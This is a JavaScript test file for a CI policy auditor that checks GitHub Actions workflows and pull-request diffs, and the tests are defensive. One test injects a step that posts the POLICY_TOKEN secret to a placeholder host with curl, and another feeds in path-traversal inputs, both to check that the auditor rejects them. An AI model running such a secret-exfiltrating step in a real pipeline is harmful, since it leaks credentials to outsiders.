import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";

import fc from "fast-check";
import { parse, stringify } from "yaml";

import {
  AnchoredPolicyError,
  auditAnchoredPullRequestData,
} from "./anchored-policy.mjs";
import { auditPolicyWorkflow } from "./workflow-policy.mjs";

const releaseSource = await readFile(
  new URL("../.github/workflows/release.yml", import.meta.url),
  "utf8",
);
const policySource = await readFile(
  new URL("../.github/workflows/policy.yml", import.meta.url),
  "utf8",
);

const baseSha = "a".repeat(40);
const headSha = "b".repeat(40);

function candidate(overrides = {}) {
  return {
    baseSha,
    headSha,
    changedPaths: [".github/workflows/release.yml"],
    candidateMode: "100644",
    candidateSize: Buffer.byteLength(releaseSource),
    candidateWorkflow: releaseSource,
    ...overrides,
  };
}

test("the secondary policy workflow runs every public gate without credentials", () => {
  assert.deepEqual(auditPolicyWorkflow(policySource), []);
  const workflow = parse(policySource);
  workflow.permissions.contents = "write";
  workflow.jobs.policy.steps.push({
    name: "Export",
    env: { TOKEN: "${{ secrets.POLICY_TOKEN }}" },
    run: "curl --data-binary \"$TOKEN\" https://example.invalid",
  });
  const diagnostics = auditPolicyWorkflow(stringify(workflow));
  assert.deepEqual(diagnostics.map(({ code }) => code), ["policy-ci-contract"]);
});

test("the protected-base evaluator accepts only bounded candidate workflow data", () => {
  assert.deepEqual(auditAnchoredPullRequestData(candidate()), []);
  const invalid = auditAnchoredPullRequestData(candidate({
    baseSha: "A".repeat(40),
    candidateMode: "100755",
    candidateSize: 0,
  }));
  assert.deepEqual(
    invalid.map(({ code }) => code),
    ["candidate-blob-boundary", "immutable-sha-boundary"],
  );
});

test("protected policy, dependency, key, and workflow roots require bootstrap review", () => {
  // Property: every protected root outside release.yml is rejected as PR-head data.
  fc.assert(fc.property(
    fc.constantFrom(
      "scripts/workflow-policy.mjs",
      "keys/zergchat-stable-updater.pubkey",
      "package.json",
      "package-lock.json",
      ".github/workflows/policy.yml",
      ".github/workflows/policy-anchor.yml",
    ),
    (path) => {
      const diagnostics = auditAnchoredPullRequestData(candidate({
        changedPaths: [".github/workflows/release.yml", path],
      }));
      assert.ok(diagnostics.some(({ code }) => code === "protected-policy-change"));
    },
  ));
});

test("unbounded, duplicate, absolute, and parent-traversing diff paths fail closed", () => {
  for (const changedPaths of [
    ["same", "same"],
    ["/absolute"],
    ["requests/../keys/root"],
    new Array(257).fill(0).map((_, index) => `requests/${index}.json`),
  ]) {
    const diagnostics = auditAnchoredPullRequestData(candidate({ changedPaths }));
    assert.ok(diagnostics.some(({ code }) => code === "diff-boundary"));
  }
});

test("a hostile candidate release workflow is rejected as data", () => {
  const workflow = parse(releaseSource);
  workflow.permissions.contents = "write";
  const hostile = stringify(workflow);
  const diagnostics = auditAnchoredPullRequestData(candidate({
    candidateSize: Buffer.byteLength(hostile),
    candidateWorkflow: hostile,
  }));
  assert.deepEqual(diagnostics.map(({ code }) => code), ["candidate-workflow"]);
});

test("non-object anchored input throws an exact public error", () => {
  assert.throws(
    () => auditAnchoredPullRequestData(null),
    (error) => error instanceof AnchoredPolicyError &&
      error.message === "anchored pull request data must be an object",
  );
});
